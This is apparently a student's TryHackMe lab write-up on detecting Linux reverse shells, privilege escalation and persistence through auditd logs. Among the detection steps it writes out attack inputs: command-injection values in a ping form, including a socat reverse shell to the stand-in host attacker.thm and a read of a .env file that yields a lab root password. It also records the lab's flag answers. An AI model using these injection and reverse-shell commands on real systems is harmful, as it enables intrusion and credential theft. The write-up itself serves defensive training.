# [Linux Security Monitoring]

**TryHackMe Path**: [SOC Level 1]  
**Lab Topic**: [Linux Threat Detection 3]  
**Date Completed**: [03/04/2026]

---

## 🧠 Summary

> In this lab, I learned the importance of understanding the last stages of attacks on Linux systems and how they appear in system logs. These stages help defenders identify when attackers are trying to maintain control of a compromised system or hide their activity.
They often include actions such as installing backdoors, creating persistence mechanisms, or deleting evidence. By recognizing these behaviors in logs, security analysts can detect ongoing compromises, investigate what the attacker did, and remove their access before
further damage occurs. This knowledge is essential for SOC analysts because it strengthens incident response and helps protect systems from long-term exploitation.

---

## 🎯 Objectives
- [ ] Learn how reverse shells are used in Linux intrusions
- [ ] Understand how the attackers escalate their privileges
- [ ] Explore the five most common techniques to persist on Linux
- [ ] Uncover the learned techniques through the system logs 
      
---

## 🧰 Tools Used
- THM Attackbox
- THM Terminal
- THM Mozilla FireFox

---

## 📊 Analysis & Screenshots

*** Reverse Shells ***

> In this section, I answered several questions related to using the attached VM to see how the TryPingMe vulnerability works. For the first question, I had to run a command and determine the output displayed after the ping results. To do this, I first launched the
TryPingMe application on the AttackBox using the browser and navigated to the website:

http://MACHINE_IP:8000


After launching the application, I entered the command:

127.0.0.1 && whoami


and pressed Enter. After doing so, I retrieved the output:

svctrypingme
>
> <img width="870" height="305" alt="2" src="https://github.com/user-attachments/assets/246187bf-34dd-4fdc-bc95-c746418fe11e" />
> <img width="643" height="337" alt="1" src="https://github.com/user-attachments/assets/deacb349-1886-4652-94d2-b0622b666494" />

> For the next question, I had to spawn a reverse shell to the imaginary attacker.thm address by running a command in the TryPingMe application in order to retrieve a hidden flag. To do this, I entered the command:

127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh


After running the command, I retrieved the hidden flag:

THM{revshells_practitioner!}
>
> <img width="594" height="423" alt="3" src="https://github.com/user-attachments/assets/bfff1cda-7dd5-41be-9ab8-717df53ea8b7" />

> For the final question in this section, I had to determine which IP address spawned a similar reverse shell through the TryPingMe application by examining the exported auditd logs located at:

/home/ubuntu/scenario


I opened the Terminal and ran the command:

ausearch -i -if /home/ubuntu/scenario/audit.log


After reviewing the results, I identified the IP address that spawned the reverse shell as:

10.14.105.255
>
> <img width="1070" height="755" alt="4" src="https://github.com/user-attachments/assets/e0e0db12-4155-4f01-9e12-eec5810d5d77" />

*** Privilege Escalation ***

> In this section, I answered several questions related to the TryPingMe scenario and analyzed what occurred after the reverse shell was established.

For the first question, I had to determine which command line was used to search for the keyword “pass” within files. To do this, I first escalated privileges by entering:

sudo su


After becoming the root user, I ran:

ausearch -i -if /home/ubuntu/scenario/audit.log | grep pass


After reviewing the results, I identified the command used as:

grep -iR pass .
>
> <img width="994" height="171" alt="5" src="https://github.com/user-attachments/assets/d04ec9fb-082a-4d91-8b28-51e56249e9d2" />

> For the next question, I had to determine which command line was used to escalate privileges to root. To do this, I ran:

ausearch -i -if /home/ubuntu/scenario/audit.log | grep root


After reviewing the results, I discovered the command used was:

su root
>
> <img width="1171" height="228" alt="6" src="https://github.com/user-attachments/assets/c3f87c0a-0de2-436c-a8ba-3ad81c20f286" />

> For the final question in this section, I had to examine the detected .env file and determine the root password. To do this, I ran:

ausearch -i -if /home/ubuntu/scenario/audit.log | grep .env


From the results, I discovered the command used:

cat .env.local


I then executed the command through the TryPingMe application using:

127.0.0.1 && cat .env.local


After running the command, I discovered that the root password was:

nGql1pQkGa
>
> <img width="1373" height="196" alt="7" src="https://github.com/user-attachments/assets/c1f8e533-ddb8-45bd-a513-bb37060860a2" />
> <img width="970" height="446" alt="8" src="https://github.com/user-attachments/assets/a2a5a870-b70f-432b-b711-922c7eeab8e2" />

*** Startup Persistence ***

> In this section, I answered questions related to detecting persistence mechanisms using auditd logs.

For the first question, I had to find the hidden flag after running malware that persisted as a system service. To investigate this, I ran:

ausearch -i -f /etc/systemd


From the results, I discovered the malicious service:

/etc/systemd/system/tux.service


I then examined the service file by running:

cat /etc/systemd/system/tux.service


This revealed the execution path:

ExecStart=/var/lib/misc/tux


I then ran:

grep -a "THM" /var/lib/misc/tux


which returned the hidden flag:

THM{hidden_penguin!}
>
> <img width="1290" height="244" alt="9" src="https://github.com/user-attachments/assets/27c7c26a-612d-400f-a4f6-d20279da357c" />
> <img width="717" height="209" alt="10" src="https://github.com/user-attachments/assets/bcb5762c-8d8d-4116-b604-e86a626a6361" />
> <img width="1162" height="152" alt="11" src="https://github.com/user-attachments/assets/4e1efdd2-842d-4627-b39f-44a50e1137b9" />

> For the last question in this section, I had to find another hidden flag from malware persisting as a cron job. I first escalated privileges using:

sudo su


Then I ran:

ausearch -i -x crontab


which revealed the working directory:

cwd=/var/spool/cron


I then investigated the cron jobs by running:

ls /var/spool/cron/crontabs
crontab -l
ls /var/spool/cron/crontabs/root


After examining the cron configuration, I identified the persistence mechanism and retrieved the hidden flag:

THM{ressurect_on_reboot!}
>
> <img width="1095" height="229" alt="12" src="https://github.com/user-attachments/assets/5d0492fc-ee61-4c10-8005-d870dece3873" />
> <img width="507" height="42" alt="13" src="https://github.com/user-attachments/assets/5c101dc6-4f7c-4b2b-bc6f-e7dad8b44219" />
> <img width="773" height="693" alt="14" src="https://github.com/user-attachments/assets/ac38bc30-c77d-4f70-bed0-d72c826d0a4b" />

*** Account Persistence ***

> In the final section of this room, I answered questions related to detecting two additional persistence methods on the VM: a backdoored user account and an SSH key.

For the first question, I had to determine which user account was created and added to the sudo group. To do this, I ran:

cat /var/log/audit/audit.log | grep -E 'useradd|usermod'


After reviewing the output, I discovered that the created user account was:

koichi
>
> <img width="1500" height="171" alt="15" src="https://github.com/user-attachments/assets/de0bde56-4d01-426a-9fdb-d32fcf555432" />

> For the last question, I had to determine which file was modified to allow SSH key persistence. To do this, I ran:

ausearch -i -f /.ssh/authorized_keys


After reviewing the output, I identified the modified file as:

/root/.ssh/authorized_keys
>
> <img width="1224" height="468" alt="16" src="https://github.com/user-attachments/assets/985248f0-ba15-454d-b804-491037bec980" />

--- 

## Reflection

> This lab strengthened my ability to understand the final stages of attacks on Linux systems and how they appear in system logs.
